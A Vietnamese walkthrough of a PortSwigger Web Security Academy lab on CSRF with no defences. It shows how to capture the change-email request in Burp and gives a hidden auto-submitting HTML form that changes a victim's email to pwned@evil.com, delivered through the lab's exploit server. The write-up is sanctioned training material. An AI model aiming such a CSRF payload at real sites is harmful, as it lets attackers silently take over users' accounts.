# CSRF vulnerability with no defenses (COMMUNITY Edition)
**Mục tiêu**: 
- Lab này yêu cầu bạn tạo một trang HTML độc hại (CSRF exploit).
- Khi nạn nhân mở trang đó, browser của họ sẽ tự động gửi request POST để đổi email tài khoản của họ, mà họ không hề biết.
- Vì lab không có bất kỳ bảo vệ CSRF nào, nên bạn chỉ cần tạo đúng request → sẽ thành công.

## 1. Mở Burp và đăng nhập để lấy request

Để tạo được CSRF, bạn phải biết chính xác request thật mà server yêu cầu khi đổi email, bao gồm:
- đường dẫn chính xác (ví dụ `/my-account/change-email`)
- request dùng POST hay GET
- tham số server muốn (`email=...`)
- URL đầy đủ gồm subdomain của lab

Bạn cần:
- Mở Burp Suite → bật Proxy Intercept Off → Mở Burp Browser.
- Truy cập lab với tài khoản: `wiener:peter` 
- Vào trang My Account và đổi email thử.

## 2. Tìm request đổi email
- Tìm request kiểu:
```
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
```
- Copy `<lab-id>`.
<img width="516" height="185" alt="image" src="https://github.com/user-attachments/assets/a8a8be74-2172-495e-9467-700987754b53" />

## 3. Tạo HTML exploit
- Tạo một file HTML như sau:
```
<html>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="pwned%40evil.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
- `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`: Vì request gốc có medthod là `POST`, và `action` chứa URL nơi gửi request giả đến.
- `<input type="hidden" name="email" value="pwned%40evil.com">`: Browswer sẽ gửi `email=...` mà nạn nhân không thấy và không cần bấm (`input type="hidden"`).
- `document.forms[0].submit();`: Auto-submit.

## 4. Exploit
- Bấm `Go to exploit server` và dán phần code ở ##3 vào phần `Body`.
<img width="815" height="356" alt="image" src="https://github.com/user-attachments/assets/0ef4d148-9c4c-43fa-8c83-1061178da759" />

- Click Store.
- Bấm `View exploit` để kiểm tra. Nếu mail đã đổi từ mail nạn nhân sang mail mình muốn là thành công.
- Nhấn `Deliver to victim` và xong lab!
